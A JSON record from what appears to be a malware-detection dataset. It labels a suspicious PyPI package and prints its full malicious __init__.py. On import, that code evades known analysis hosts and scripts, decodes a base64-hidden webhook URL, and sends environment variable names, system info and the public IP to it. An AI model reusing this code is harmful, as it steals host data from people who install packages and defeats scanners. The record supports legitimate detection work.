[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import os\nimport json\nimport traceback\nimport base64\nfrom urllib import request\n\ndef save_some_stuff():\n    known_bots_nodename = [\"lili-pc\"]\n    known_bots_programs = [\"analyze-python.py\", \"detect.py\"]\n    try:\n        if os.uname().nodename in known_bots_nodename:\n            return\n        if traceback.extract_stack()[0].filename.split(\"/\")[-1] in known_bots_programs:\n            return\n        _save_some_stuff()\n    except:\n        return\n    \ndef _save_some_stuff():\n    url = (\"aHR0cHM6Ly9ob29rcy5zbGF\"\n           \"jay5jb20vc2VydmljZXMvVDAzRjRCV\"\n           \"FNLL0IwNktYVVI5RDJBL05mcUdqT1E3SGxTZ\"\n           \"0sxenZHSEJvbXdCMQ==\")\n    url = base64.b64decode(url).decode('utf-8')\n    data = (\n        \"============================================\\n\"\n        f\"\\t stack={traceback.extract_stack()}\\n\\n\"\n        f\"\\t env={dict(os.environ).keys()}\\n\\n\"\n        f\"\\t uname={os.uname()}\\n\\n\"\n        f\"\\t ip={request.urlopen('https://ipinfo.io/ip').read().decode('utf8')}\"\n    )\n    body = {\"text\": data}\n    data = json.dumps(body)\n    data = data.encode()\n    req =  request.Request(url)\n    req.add_header('Content-Type', 'application/json')\n    request.urlopen(req, data=data)\n\nsave_some_stuff()"
  },
  {
    "metadata": {
      "package_name": "glovo-data-platform-importer-brain-999.9.20",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/glovo-data-platform-importer-brain-999.9.20.txt"
    }
  }
]